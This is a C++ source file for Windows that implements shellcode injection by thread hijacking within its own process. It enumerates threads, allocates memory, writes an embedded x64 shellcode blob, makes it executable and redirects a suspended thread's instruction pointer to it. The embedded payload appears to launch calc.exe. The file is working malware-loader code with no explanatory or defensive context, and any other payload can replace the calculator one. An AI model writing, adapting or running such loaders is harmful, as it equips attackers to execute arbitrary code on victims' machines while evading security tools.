#include <Windows.h>
#include <cstdio>
#include <TlHelp32.h>
#include <processthreadsapi.h>


BOOL	GetLocalThreadHandle(IN DWORD dwMainthreadid, OUT DWORD* dwthreadid, OUT HANDLE* hThread) {
	// Getting the local process ID
	DWORD           dwProcessId = GetCurrentProcessId();
	HANDLE          hSnapShot = NULL;
	THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32)
	};
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}
	if (!Thread32First(hSnapShot, (LPTHREADENTRY32)&Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}
		do {
			if (Thr.th32OwnerProcessID == dwProcessId && dwMainthreadid != Thr.th32ThreadID) {
				*dwthreadid = Thr.th32ThreadID;
				*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);
				printf("[i] Thread ID : %lu\n", *dwthreadid);
				printf("[i] Thread Handle : %p\n", (void*)*hThread);
				if (*hThread == NULL)
					printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

				break;
				}
		} while (Thread32Next(hSnapShot, (LPTHREADENTRY32)&Thr));
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwthreadid == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}
BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {


	SIZE_T  sNumberOfBytesWritten = NULL;
	DWORD   dwOldProtection = NULL;

	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

BOOL HijackThread(HANDLE hthread, PVOID pAddress) {
	CONTEXT ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};
	SuspendThread(hthread);
	if (!GetThreadContext(hthread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	ThreadCtx.Rip =  (DWORD64) pAddress;
	if (!SetThreadContext(hthread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[#] Press <Enter> To Run ... ");
	//getchar();

	ResumeThread(hthread);

	WaitForSingleObject(hthread, INFINITE);

	return TRUE;

}



int main() {
	char pay[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	SIZE_T s = sizeof(pay)-1;

	DWORD dwMainthreadid = GetCurrentThreadId();

	DWORD  dwthreadid = 0;
	HANDLE hThread = NULL;
	
	GetLocalThreadHandle(dwMainthreadid, &dwthreadid, &hThread);

	HANDLE hprocess = GetCurrentProcess();
	PVOID pAddress = NULL;
	InjectShellcodeToRemoteProcess(hprocess, (PBYTE)&pay, s, &pAddress);
	HijackThread(hThread, pAddress);

	return 0;
}